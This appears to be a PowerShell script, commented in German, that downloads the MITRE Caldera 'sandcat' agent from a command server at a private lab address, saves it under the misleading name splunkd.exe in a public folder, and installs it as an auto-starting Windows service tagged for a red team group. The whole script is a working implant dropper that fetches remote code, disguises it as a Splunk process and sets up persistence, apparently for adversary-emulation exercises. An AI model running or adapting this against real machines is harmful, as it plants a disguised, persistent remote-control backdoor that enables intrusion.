# Variablen definieren
$agentPath = "C:\Users\Public\splunkd.exe"
$serviceName = "CalderaAgent"
$serviceDisplayName = "Caldera Agent Service"
$serviceDescription = "Service for running Caldera Agent"
$server = "http://192.168.56.32:8888"
$url = "$server/file/download"

# WebClient initialisieren
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform", "windows")
$wc.Headers.add("file", "sandcat.go")

# Agent herunterladen
$data = $wc.DownloadData($url)

# Laufenden Agent stoppen (falls vorhanden)
Get-Process | Where-Object { $_.Modules.FileName -like $agentPath } | Stop-Process -Force -ErrorAction SilentlyContinue

# Alte Agent-Datei löschen
Remove-Item -Force $agentPath -ErrorAction SilentlyContinue

# Neue Agent-Datei speichern
[IO.File]::WriteAllBytes($agentPath, $data)

# Prüfen, ob der Dienst bereits existiert
if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
    # Dienst stoppen und entfernen
    Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
    sc.exe delete $serviceName
}

# Dienst erstellen
sc.exe create $serviceName binPath= "$agentPath -server $server -group red" start= auto

# Dienstbeschreibung hinzufügen
sc.exe description $serviceName $serviceDescription

# Dienst starten
Start-Service -Name $serviceName
